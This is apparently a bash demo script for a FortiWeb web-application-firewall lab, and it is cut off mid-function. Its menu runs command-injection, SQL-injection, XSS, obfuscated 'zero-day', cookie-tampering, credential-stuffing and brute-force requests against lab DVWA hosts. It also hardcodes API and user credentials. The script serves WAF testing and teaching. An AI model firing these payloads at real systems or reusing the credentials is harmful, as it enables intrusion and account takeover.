# menu from github.com/barbw1re/bash-menu
# bot from github.com/FortinetSecDevOps/FortiWeb-Advanced-Threat-Lab
#!/bin/bash

###############################################
## Specific to the Lab
###############################################
DVWA_URL="https://dvwa.corp.fabriclab.ca"
DVWA_HOST="dvwa.corp.fabriclab.ca"
SHOP_URL="https://shop.corp.fabriclab.ca"
FWB_URL="https://fwb.corp.fabriclab.ca"
SPEEDTEST_URL="http://speedtest.corp.fabriclab.ca"
KALI_URL="https://flbr1kali01.fortiweb.fabriclab.ca"
TOKEN=$(echo '{"username":"userapi","password":"userAPI123!"}' | base64)
FWB_MGT_IP="10.163.7.21"
POLICY="main-policy"


###############################################
## Ensure we are running under bash
###############################################
if [ "$BASH_SOURCE" = "" ]; then
    /bin/bash "$0"
    exit 0
fi


###############################################
# Load bash-menu script
#
# NOTE: Ensure this is done before using
#       or overriding menu functions/variables.
###############################################
. "bash-menu.sh"


###############################################
## Debug option disabled by default
###############################################
  DEBUG="disable"


############################################################################
## Colors
############################################################################
BOLD='\033[1m'
RESTORE='\033[0m'
RED='\033[00;31m'
RED_BOLD='\033[1;31m'
GREEN='\033[00;32m'
GREEN_BOLD='\033[1;32m'
YELLOW='\033[00;33m'
YELLOW_BOLD='\033[1;33m'
CYAN_BOLD='\033[00;34m'
CYAN_BOLD_BOLD='\033[1;34m'
PURPLE='\033[00;35m'
PURPLE_BOLD='\033[1;35m'
CYAN='\033[00;36m'
CYAN_BOLD='\033[1;36m'
LIGHTGRAY='\033[00;37m'
LIGHTGRAY_BOLD='\033[1;37m'
WHITE='\033[37m'
WHITE_BOLD='\033[1;37m'


###############################################
## Check Options and Help menu
###############################################
if [ $# -gt 0 ]; then
   case $1 in
  --debug) DEBUG="enable";;
  --help) echo ""; echo "Usage: ${0} [options...]"; echo ""
     echo "Options:"
     echo "  --debug    Turn on debug to show requests"
     echo "  --help     Show program usage"
     echo "";exit;;
  *) echo ""; echo "Usage: ${0} [options...]"
     echo "Options:"
     echo "  --debug    Turn on debug to show requests"; echo ""
     echo "  --help     Show programm usage"
     echo "";exit;;
esac
   echo "??"
fi


###############################################
## Machine Learning Scripts
###############################################
initAll() {
  COUNTER=0
  COUNT=0
  RANGE=255
  I=1
  SP=" / - \ |"
  ILLEGALCHARS="[._?&'\" \[]"
  FIRSTNAME="firstname"
  LASTNAME="lastname"
  ADDRESS="address"
  CITY="city"
  STATE="state"
  POSTAL="postal"
  POSTALNUMERIC_LENGTH=4
  POSTALALPHA_LENGTH=2
  COUNTRY="country"
  EMAIL="email"
  FORMID="form_id"
  SUBMIT="submit"
  CONTENTTYPE="application/x-www-form-urlencoded"
  URL="${DVWA_URL}/fwb/index.html"
  USERAGENT="ML-Request-generator"
  REQUESTTIMEOUT=3
}

firerequest-learn() {
   COUNTER=0
   until [ $COUNTER -eq $COUNT ]
   do
     FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z0-9@' | fold -w $FIRSTNAME_LENGTH | head -n 1)
     LASTNAME_LENGTH=`shuf -i 6-25 -n 1`
     LASTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z0-9-' | fold -w $LASTNAME_LENGTH | head -n 1)
     ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
     ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
     CITY_LENGTH=`shuf -i 8-30 -n 1`
     CITYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z0-9-' | fold -w $CITY_LENGTH | head -n 1)
     STATE_LENGTH=`shuf -i 6-14 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 8-18 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $COUNTRY_LENGTH | head -n 1)
     FORMID_LENGTH=5
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

firerequest-relearn() {
   COUNTER=0
   until [ $COUNTER -eq $COUNT ]
   do
     FIRSTNAME_LENGTH=`shuf -i 9-22 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $FIRSTNAME_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     LASTNAME_LENGTH=`shuf -i 12-35 -n 1`
     LASTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $LASTNAME_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     ADDRESS_LENGTH=`shuf -i 3-32 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $ADDRESS_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     ADDRESSNUMBER_LENGTH=`shuf -i 4-9 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $ADDRESSNUMBER_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     CITY_LENGTH=`shuf -i 8-30 -n 1`
     CITYVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $CITY_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     STATE_LENGTH=`shuf -i 9-24 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $STATE_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $POSTALNUMERIC_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $POSTALALPHA_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 12-38 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $COUNTRY_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     FORMID_LENGTH=15
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

firerequest-XSS() {
   COUNTER=0
   until [ $COUNTER -eq $COUNT ]
   do
     FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $FIRSTNAME_LENGTH | head -n 1)
     ####### XSS HERE #######
     LASTNAMEVALUE='<script>alert("XSS-hack-attempt")</script>'
     ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
     ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
     CITY_LENGTH=`shuf -i 8-30 -n 1`
     CITYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $CITY_LENGTH | head -n 1)
     STATE_LENGTH=`shuf -i 6-14 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 8-18 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $COUNTRY_LENGTH | head -n 1)
     FORMID_LENGTH=5
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

firerequest-ExploitZeroDayCMDi() {
   COUNTER=0
   until [ $COUNTER -eq $COUNT ]
   do
     FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $FIRSTNAME_LENGTH | head -n 1)
     ####### Zero-Day HERE #######
     LASTNAMEVALUE='/%3F%3F%3F/1%3F - /???/1?'
     ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
     ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
     CITY_LENGTH=`shuf -i 8-30 -n 1`
     CITYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $CITY_LENGTH | head -n 1)
     STATE_LENGTH=`shuf -i 6-14 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 8-18 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $COUNTRY_LENGTH | head -n 1)
     FORMID_LENGTH=5
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

firerequest-ExploitZeroDaySQLi() {
    COUNTER=0
    until [ $COUNTER -eq $COUNT ]
    do
     FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $FIRSTNAME_LENGTH | head -n 1)
     LASTNAME_LENGTH=`shuf -i 6-25 -n 1`
     LASTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $LASTNAME_LENGTH | head -n 1)
     ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
     ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
     ####### Zero-Day HERE #######
     CITYVALUE="A%20'DIV'%20B%20-%20A%20'DIV%20B"
     STATE_LENGTH=`shuf -i 6-14 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 8-18 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $COUNTRY_LENGTH | head -n 1)
     FORMID_LENGTH=5
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

firerequest-ExploitSQLi() {
    COUNTER=0
    until [ $COUNTER -eq $COUNT ]
    do
     FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $FIRSTNAME_LENGTH | head -n 1)
     LASTNAME_LENGTH=`shuf -i 6-25 -n 1`
     LASTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $LASTNAME_LENGTH | head -n 1)
     ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
     ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
     ####### SQL INJECTION HERE #######
     CITYVALUE="'OR 1=1#"
     STATE_LENGTH=`shuf -i 6-14 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 8-18 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $COUNTRY_LENGTH | head -n 1)
     FORMID_LENGTH=5
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

printprogress() {
  [[ $1 = *5 ]] && printf "\b${SP:I++%${#SP}:1}"
  [[ $1 = *00 ]] && echo -n "$1 "
}

webrequest() {
  [ ${DEBUG} == "enable" ] && echo "URL:"${URL} "POSTDATA":${POSTDATA}
  curl -k -A ${USERAGENT} -m ${REQUESTTIMEOUT} -g --retry 3 --retry-delay 1 -s -o /dev/null -X ${METHOD} -H "Content-Type: ${CONTENTTYPE}" "${URL}" -d "$POSTDATA" &
}

############################################################################
## Menu Actions
##
## They should return 1 to indicate that the menu
## should continue, or return 0 to signify the menu
## should exit.
############################################################################

############################################################################
## Scan & Standard Attacks
############################################################################

Vulnerability_Scanner() {
    rm -Rf /var/www/html/report/report
    echo ""
    skipfish -u -k 0:0:30 -o /var/www/html/report/report ${DVWA_URL}
    echo -e "${BOLD}Scan Report available at ${KALI_URL}"
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

Command_Injection() {
    echo ""
    echo -e "Command Injection Attack (Pablo)"
    echo ""
    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${YELLOW_BOLD}pablo${RESTORE} password=${YELLOW_BOLD}letmein${RESTORE}"
    echo ""
    curl "${DVWA_URL}/login.php" \
        -H "authority: ${DVWA_HOST}" \
        -H "cache-control: max-age=0" \
        -H "content-type: application/x-www-form-urlencoded" \
        -H "origin: ${DVWA_URL}" \
        -H "referer: ${DVWA_URL}/" \
        -H "user-agent: FortiWeb Demo Script" \
        --insecure \
        --data-raw "username=pablo&password=letmein&Login=Login" \
        -c cookie.txt

    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/exec/${RESTORE} submit=${RED_BOLD}\";ls\""
    echo ""
    curl -s "${DVWA_URL}/vulnerabilities/exec/" \
        -H "authority: ${DVWA_HOST}" \
        -H "cache-control: max-age=0" \
        -H "content-type: application/x-www-form-urlencoded" \
        -H "origin: ${DVWA_URL}" \
        -H "referer: ${DVWA_URL}/index.php" \
        -H "user-agent: FortiWeb Demo Script" \
        --insecure \
        --data-raw "ip=;ls&Submit=Submit" \
        -b cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'

    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

SQL_Injection() {
    echo ""
    echo -e "SQL Injection Attack (Gordon)"
    echo ""
    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${YELLOW_BOLD}gordonb${RESTORE} password=${YELLOW_BOLD}abc123${RESTORE}\n"
    curl "${DVWA_URL}/login.php" \
        -H "authority: ${DVWA_HOST}" \
        -H "cache-control: max-age=0" \
        -H "content-type: application/x-www-form-urlencoded" \
        -H "origin: ${DVWA_URL}" \
        -H "referer: ${DVWA_URL}/" \
        -H "user-agent: FortiWeb Demo Script" \
        --insecure \
        --data-raw "username=gordonb&password=abc123&Login=Login" \
        -c cookie.txt

    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/sqli/${RESTORE} id=${RED_BOLD}\"'OR 1=1#\"\n"
    curl -s "${DVWA_URL}/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit" \
        -H "authority: ${DVWA_HOST}" \
        -H "cache-control: max-age=0" \
        -H "content-type: application/x-www-form-urlencoded" \
        -H "origin: ${DVWA_URL}" \
        -H "referer: ${DVWA_URL}/index.php" \
        -H "user-agent: FortiWeb Demo Script" \
        --insecure \
        -b cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'

    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

Cookie_Security() {
    echo ""
    echo -e "Cookie Security (Smith)"
    echo ""
    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${CYAN_BOLD}smithy${RESTORE} password=${CYAN_BOLD}password${RESTORE}"
    echo ""
    curl "${DVWA_URL}/login.php" \
        -H "authority: ${DVWA_HOST}" \
        -H "cache-control: max-age=0" \
        -H "content-type: application/x-www-form-urlencoded" \
        -H "origin: ${DVWA_URL}" \
        -H "referer: ${DVWA_URL}/" \
        -H "user-agent: FortiWeb Demo Script" \
        --insecure \
        --data-raw "username=smithy&password=password&Login=Login" \
        -c cookie.txt

    echo -e "We have 3 cookies. Security Cookie = ${RED_BOLD}low${RESTORE}."
    echo ""
    grep $DVWA_HOST cookie.txt
    echo ""
    echo -en "Let's change the value to ${RED_BOLD}medium${RESTORE}. Press enter to continue... "
    read response
    echo ""
    sed -i 's/low/medium/' cookie.txt
    grep $DVWA_HOST cookie.txt
    echo ""
    echo -en "Now that we've changed the security level, let's connect again to the server. Press enter to continue... "
    read response
    echo ""
    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/security.php\n${RED_BOLD}"
    curl "${DVWA_URL}/security.php" \
        -H "authority: ${DVWA_HOST}" \
        -H "cache-control: max-age=0" \
        -H "content-type: application/x-www-form-urlencoded" \
        -H "origin: ${DVWA_URL}" \
        -H "referer: ${DVWA_URL}/index.php" \
        -H "user-agent: FortiWeb Demo Script" \
        --insecure \
        -b cookie.txt 

    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

Credential_Stuffing() {
    echo ""
    echo -e "Credential Stuffing Detection (pklangdon4@msn.com)"
    echo ""
    echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${YELLOW_BOLD}pklangdon4@msn.com${RESTORE} password=${YELLOW_BOLD}ppl11266${RED_BOLD}"
    echo ""
    curl -s "${DVWA_URL}/login.php" \
        -H "authority: ${DVWA_HOST}" \
        -H "cache-control: max-age=0" \
        -H "content-type: application/x-www-form-urlencoded" \
        -H "origin: ${DVWA_URL}" \
        -H "referer: ${DVWA_URL}/" \
        -H "user-agent: FortiWeb Demo Script" \
        --insecure \
        --data-raw "username=pklangdon4@msn.com&password=ppl11266&Login=Login" \
        -c cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'

    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

Brute_Force_Attack() {
    echo ""
    echo "Brute Force Attack"
    echo ""
    echo -e "For demo purposes, the HTTP access limit is set to ${WHITE_BOLD}5 connections per second${RESTORE}."
    echo ""
    for i in {1..25}
    do
    if curl -k -s -f $SPEEDTEST_URL > /dev/null; then
        echo -e "Attempt $i:\tConnection to $SPEEDTEST_URL ${GREEN_BOLD}successful${RESTORE}."
    else
        echo -e "Attempt $i:\tConnection to $SPEEDTEST_URL ${RED_BOLD}failed${RESTORE}."
    fi
    done
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

############################################################################
## Machine Learning Actions
############################################################################
ML_Learn_Parameters() {
    COUNT=3000
    METHOD="POST"
    echo -e "\nSending 3000 requests - Learn\n"
    echo -en "${GREEN}Requests : "
    firerequest-learn
    echo ""
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Relearn_Parameters() {
    COUNT=3000
    METHOD="POST"
    echo -e "\nSending 3000 requests - Relearn\n"
    echo -en "${GREEN}Requests : "
    firerequest-relearn
    echo ""
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Exploit_XSS() {
    COUNT=1
    METHOD="POST"
    echo ""
    echo -e "Sending Cross-Site Scripting"
    firerequest-XSS
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Exploit_SQLi() {
    COUNT=1
    METHOD="POST"
    echo ""
    echo -e "Sending SQL Injection"
    firerequest-ExploitSQLi
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Exploit_ZeroDay_CMDi() {
    COUNT=1
    METHOD="POST"
    echo ""
    echo -e "Sending Zero-Day Command Injection"
    firerequest-ExploitZeroDayCMDi
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Exploit_ZeroDay_SQLi() {
    COUNT=1
    METHOD="POST"
    echo ""
    echo -e "Sending Zero-Day SQL Injection"
    firerequest-ExploitZeroDaySQLi
    echo ""
    echo -en "${YELLOW_BOLD}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Custom_Request() {
    COUNTER=0
    echo ""
    printf "Amount of request (${YELLOW_BOLD}1${RESTORE}): "
    read COUNT
    printf "URL (${YELLOW_BOLD}${FWB_URL}/fwb/index.html${RESTORE}): "
    read URL
    printf "Method (GET, ${YELLOW_BOLD}POST${RESTORE}, PUT, DELETE, OPTIONS, HEAD): "
    read METHODIN
    printf "Parameter name (${YELLOW_BOLD}firstname${RESTORE}, lastname, address, city, state, postal, country): "
    read PARAMETER
    printf "Data type (date-short, date-long, postal, email, phone, ${YELLOW_BOLD}random${RESTORE}, number-small, number-big): "
    read PARAMETERTYPE

    [ -z $URL ] && URL="${FWB_URL}/fwb/index.html"
    [ -z $COUNT ] && COUNT=1
    [ -z $METHODIN ] && METHODIN="POST"
    [ -z $PARAMETER ] && PARAMETER="firstname"
    [ -z $PARAMETERTYPE ] && PARAMETERTYPE="random"
    
    METHOD=`echo $METHODIN | tr [:lower:] [:upper:]`

    if [ -z $COUNT ] || [ -z $URL ] || [ -z $METHODIN ] || [ -z PARAMETER ] || [ -z $PARAMETERTYPE ]
    then
        echo -en "${RED_BOLD}ERROR: Empty input detected.\n${RESTORE}Press enter to continue... "
        read response
        return 1
    elif [ $METHOD != "GET" ] && [ $METHOD != "POST" ] && [ $METHOD != "PUT" ] && [ $METHOD != "DELETE" ] && [ $METHOD != "OPTIONS" ] && [ $METHOD != "HEAD" ]
    then
        echo -en "${RED_BOLD}ERROR: Invalid method given.\n${RESTORE}Press enter to continue... "
        read response
        return 1
    elif [[ $URL != *http* ]]
    then
        echo -en "${RED_BOLD}ERROR: Invalid URL given. Use http://<fqdn>/<path>/<object>.\n${RESTORE}Press enter to continue... "
        read response
        return 1
    fi
    
    echo ""
    echo -e "${GREEN}Sending ${COUNT} custom request(s)"
    if [ $COUNT -gt 99 ]
    then
        echo -n "Requests : "
    fi

    
    until [ $COUNTER -eq $COUNT ]
    do
        if [ $PARAMETERTYPE = "date-short" ]
        then
        temp=$(echo "$RANDOM * $RANDOM * $RANDOM / 1000" | bc -l)
        PARAMETERVALUE=$(date -d @$temp +%d" "%m" "%Y" "%H":"%M":"%S)
        elif [ $PARAMETERTYPE = "date-long" ]
        then
        temp=$(echo "$RANDOM * $RANDOM * $RANDOM / 1000" | bc -l)
        PARAMETERVALUE=$(date -d @$temp)
        elif [ $PARAMETERTYPE = "postal" ]
        then
        POSTALNUMERIC_LENGTH=4
        POSTALALPHA_LENGTH=2
        POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
        POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
        PARAMETERVALUE=$POSTALNUMERIC$POSTALALPHA
        elif [ $PARAMETERTYPE = "email" ]
        then
        EMAILNAME_LENGTH=`shuf -i 4-15 -n 1`
        EMAILDOMAIN_LENGTH=`shuf -i 5-20 -n 1`
        EMAILEXT_LENGTH=`shuf -i 3-4 -n 1`
        USER_NAME=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $EMAILNAME_LENGTH | head -n 1)
        DOMAIN_NAME=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $EMAILDOMAIN_LENGTH | head -n 1)
        DOMAIN_EXT=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $EMAILEXT_LENGTH | head -n 1)
